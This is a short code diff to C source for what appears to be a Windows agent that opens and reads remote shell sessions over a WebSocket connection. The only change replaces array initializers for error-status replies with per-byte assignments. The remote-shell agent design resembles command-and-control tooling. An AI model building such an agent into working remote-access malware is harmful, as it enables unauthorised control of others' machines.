@@ -34,7 +34,9 @@ static DWORD handle_open_shell(const agent_ctx *ctx, unsigned int corr_id,
     int id = shell_open(ctx->shells);
 
     if (id < 0) {
-        unsigned char status_error[8] = {1, 0, 0, 0, 0, 0, 0, 0};
+        unsigned char status_error[8];
+        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
+        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
         write_u32_le_at(status_error, 4, corr_id);
         MemoryCopy(reply, status_error, sizeof(status_error));
         *reply_len = sizeof(status_error);
@@ -87,7 +89,9 @@ static DWORD handle_read_shell(const agent_ctx *ctx, const incoming_message *msg
 
     shell_slot *slot = shell_lookup(ctx->shells, id);
     if (!slot) {
-        unsigned char status_error[8] = {1, 0, 0, 0, 0, 0, 0, 0};
+        unsigned char status_error[8];
+        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
+        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
         write_u32_le_at(status_error, 4, corr_id);
         MemoryCopy(reply, status_error, sizeof(status_error));
         *reply_len = sizeof(status_error);
@@ -100,7 +104,9 @@ static DWORD handle_read_shell(const agent_ctx *ctx, const incoming_message *msg
     int r = shell_read(slot, chunk + 8, SHELL_READ_CHUNK, &got);
 
     if (r == SHELL_READ_DEAD) {
-        unsigned char status_error[8] = {1, 0, 0, 0, 0, 0, 0, 0};
+        unsigned char status_error[8];
+        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
+        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
         write_u32_le_at(status_error, 4, corr_id);
         MemoryCopy(reply, status_error, sizeof(status_error));
         *reply_len = sizeof(status_error);
@@ -324,7 +330,9 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
         unsigned int corr_id = (msg.length >= 5) ? read_u32_le_at(msg.data, 1) : 0;
 
         if (msg.truncated) {
-            unsigned char status_error[8] = {1, 0, 0, 0, 0, 0, 0, 0};
+            unsigned char status_error[8];
+        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
+        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
             write_u32_le_at(status_error, 4, corr_id);
             err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
             if (err == NO_ERROR) {
@@ -361,7 +369,9 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
             if (err == STATUS_OK || err == STATUS_ERROR)
                 err = ws_send(ctx->winhttp, socket, reply, reply_len);
         } else {
-            unsigned char status_error[8] = {1, 0, 0, 0, 0, 0, 0, 0};
+            unsigned char status_error[8];
+        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
+        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
             write_u32_le_at(status_error, 4, corr_id);
             err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
             if (err == NO_ERROR) {
